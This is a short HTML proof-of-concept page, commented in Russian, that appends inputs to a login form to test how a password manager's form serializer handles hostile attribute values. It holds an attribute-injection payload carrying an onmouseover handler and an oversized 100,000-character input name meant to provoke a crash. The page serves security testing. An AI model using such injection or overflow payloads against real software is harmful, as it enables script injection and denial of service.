<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<form id="f">
  <input name="user">
  <input type="password" name="pass">
</form>
<script>
setTimeout(() => {
  // Попробуем инжектировать через attribute values
  const input = document.createElement('input');
  input.type = 'text';
  // Если encode() в WFD serializer не экранирует кавычки:
  input.name = 'test" onmouseover="alert(1)';
  document.getElementById('f').appendChild(input);
  
  // Длинное имя атрибута (potential overflow)
  const longInput = document.createElement('input');
  longInput.type = 'text';
  longInput.name = 'A'.repeat(100000);
  document.getElementById('f').appendChild(longInput);
  
  console.log('[PoC] Injected. Check if KPM crashes...');
}, 3000);
</script>
</body>
</html>
